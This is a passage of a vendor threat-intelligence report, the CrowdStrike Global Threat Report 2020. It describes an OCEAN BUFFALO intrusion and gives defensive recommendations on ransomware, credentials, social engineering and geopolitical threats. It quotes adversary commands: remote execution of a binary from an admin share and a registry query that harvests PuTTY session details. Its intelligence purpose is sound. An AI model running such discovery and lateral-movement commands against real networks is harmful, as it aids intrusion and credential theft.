%coMSPEC% /C sTarT "" /B "\\[REDACTED]\C$\shayminlandpichu.
exe" -accepteula -t
The interactive adversary behavior initially observed involved testing domain
trusts via nltest, likely in preparation for lateral movement, and enumerating
previous user logons. The actors also enumerated information from the registry
regarding SSH connections made using the PuTTY client, which can assist in
gathering credentials and details about account activity across the network:
reg

query HKCU\Software\SimonTatham\PuTTY\Sessions

CROWDSTRIKE GLOBAL THREAT REPORT 2020

OVERWATCH FEATURE_
The malicious operators later executed more exhaustive discovery commands and
moved laterally via SSH, WMI and SMB share connections. They also attempted
credential dumping using a variant of Mimikatz. In addition, the adversary used the
legitimate Windows Control Panel process control.exe to execute malicious
DLL implants using .cpl file extensions. Further analysis of malware found on the
network determined it shared strong similarities with KerrDown, a known OCEAN
BUFFALO tool.
As OverWatch continued hunting across the environment, evidence of intrusion
activity was extensive. The actors targeted an Exchange email server and
employed the Microsoft Exchange PowerShell snap-in to grant a compromised
valid domain user account access to several user mailboxes. Discovery and
collection actions on the server indicated the adversary’s intent to specifically
target email data belonging to senior-level officials.
Hunting also found adversary activity on Linux hosts. After successfully employing
valid accounts and execution of sudo to elevate privileges, the actors enumerated
network connections, edited shell history, viewed sensitive credential files and
accessed Puppet configuration files. Linux-based implants were also identified.

Conclusions and Recommendations
Analysis of the C2 infrastructure used in this intrusion overlapped with that of
other suspected OCEAN BUFFALO attacks. When defending against dedicated
targeted adversaries as in this case, organizations should be aware that some
techniques used in these attacks (e.g., process hollowing to execute Cobalt
Strike implants) are not easily mitigated with preventative controls. This is
because they are based on the abuse of system features. Therefore, proactive
threat hunting is critical for identifying unusual activity as soon as possible. This
intrusion also emphasizes the importance of security training and awareness for
senior executives, as targeted adversaries are prioritizing those accounts when
performing discovery and attempting data collection.

CONCLUSION
RANSOMWARE
Criminally motivated ransomware attacks dominated the headlines in 2019, and
there are currently no indications that BGH operators will decrease the pace
of their operations. Unlike BOSS SPIDER in 2018, CrowdStrike Intelligence
analysis indicates that INDRIK SPIDER remains active following the indictment
of individuals associated with the group, a testament to the group’s endurance.
Following a profitable year, WIZARD SPIDER, DOPPEL SPIDER and PINCHY
SPIDER are also unlikely to rest on their laurels. In addition to traditional criminal
enterprises, CrowdStrike Intelligence is investigating possible collaboration between
sophisticated eCrime adversaries and state-sponsored targeted intrusions, with
initial evidence suggesting some tool overlaps and/or cooperation with intelligence
services in DPRK and Russia.
Recommendation: Turn it on and push it out! Fully leverage the
protection you have.
Time and again, CrowdStrike observed successful intrusions in
environments where security controls were in place that could
have successfully blocked attacks, but were not configured by the
organization to do so or were not fully deployed across the environment.
The proliferation of BGH has dramatically increased the impact on
organizations that fail to deploy proper protections. Smart organizations
will spend the time needed to maximize the protection they gain from
existing security controls.

CREDENTIALS
The year 2019 saw increased use of valid credentials in a wide range of cyberattacks,
part of the trend toward malware-free attack techniques. Attackers obtained and
leveraged credentials to gain access to systems, move laterally across organizations
and establish persistence. As long as organizations continue to use basic user IDs and
passwords for authentication, CrowdStrike anticipates this trend will continue.

CROWDSTRIKE GLOBAL THREAT REPORT 2020

CrowdStrike Intelligence reported on data breaches enabled by the compromise of
2FA. Such incidents highlight the vulnerability of this technology and indicate that
mobile phones may continue to be a target of opportunity for malicious actors of all
motivations. CrowdStrike Intelligence expects malware designed to intercept tokens
or take screenshots of authorization messages will continue to be developed. Statesponsored targeting of mobile platforms will almost certainly be driven by purported
domestic security concerns, as exemplified by China’s use of iOS exploit chains
against minority communities (reported publicly in August 2019).
Recommendation: Protect identities.
As a baseline, 2FA should be established for all users because today’s
attackers have proven to be adept at accessing and using valid
credentials, quickly leading to deeper compromise. Properly deployed,
2FA makes it much more difficult for adversaries to leverage privileged
access to achieve their objectives.
2FA is not a panacea, however, and implementing it does not immediately
solve the problem of protecting identities. In addition to 2FA, a robust
privilege access management process will limit the damage adversaries
can do if they get in, and reduce the likelihood of lateral movement.

SOCIAL ENGINEERING
Network defenders should never underestimate the effectiveness of old-fashioned
social engineering techniques. While business email compromise (BEC) scammers
and targeted eCrime groups have long used telephone conversations to entice
victims to open an email or click on a malicious document, incidents in 2019 showed
these tactics being adopted by targeted intrusion actors supporting DPRK and
Iranian operations. Penetration testing tools like the stalwart Cobalt Strike will
remain popular and may increasingly be joined by other red-teaming tactics such as
CARBON SPIDER’s use of HID (human input device)-emulation USB devices, which
was reported in January 2020.
Recommendation: Enlist your users in the fight.
While technology is clearly critical in the fight to detect and stop
intrusions, the end user remains a critical link in the chain to stop
breaches. User awareness programs should be initiated to combat the
continued threat of phishing and related social engineering techniques.

GEOPOLITICAL TENSIONS
The very beginning of 2020 was marked by a sudden increase in tensions between
Iran and the U.S., including military action undertaken on both sides. Although
rhetoric de-escalated by mid-January, CrowdStrike Intelligence assesses that
hacktivism, disinformation campaigns on social media in Farsi and English, and
an elevated risk of targeted intrusions (including destructive attacks) will remain
through at least the first quarter of 2020. Given previously observed targeting
trends, Iran-based targeted intrusion activity is likely to target U.S. and MENA
entities in the government, oil and gas, technology and maritime sectors.
Iran and Russia have leveraged U.S. social media platforms to develop information
operations (IO) campaigns, and recent evidence has demonstrated that China is
quickly developing similar disinformation TTPs. The publication of TTPs associated
with these operations may lead to less obvious tactics in the coming year, although
the intent will remain the same — to promote division within communities.
Recommendation: Accept the 1-10-60 challenge.
Combating sophisticated adversaries requires a mature process that
can prevent, detect and respond to threats with speed and agility.
CrowdStrike urges organizations to pursue the “1-10-60 rule” in order to
effectively combat sophisticated cyberthreats:
Detect intrusions in under one minute.
 Investigate and understand threats in under 10 minutes.
C
 ontain and eliminate the adversary from the environment
in under 60 minutes.
Organizations that meet this 1-10-60 benchmark are much more likely to eradicate the
adversary before the attack spreads from its initial entry point, minimizing impact and
further escalation. Meeting this challenge requires investment in deep visibility, as well
as automated analysis and remediation tools across the enterprise, reducing friction
and enabling responders to understand threats and take fast, decisive action.
Recommendation: Look for partners to help fill the talent gap.
Operating at 1-10-60 velocity also takes more than technology.
Defending against sophisticated threats ultimately requires mature
processes and effective, dedicated security professionals. Not every
organization is equipped to engage in this sort of battle 24/7. Successful
enterprises often look outward for help, partnering with best-in-class
external solution providers to help fill critical talent gaps in a costeffective manner.
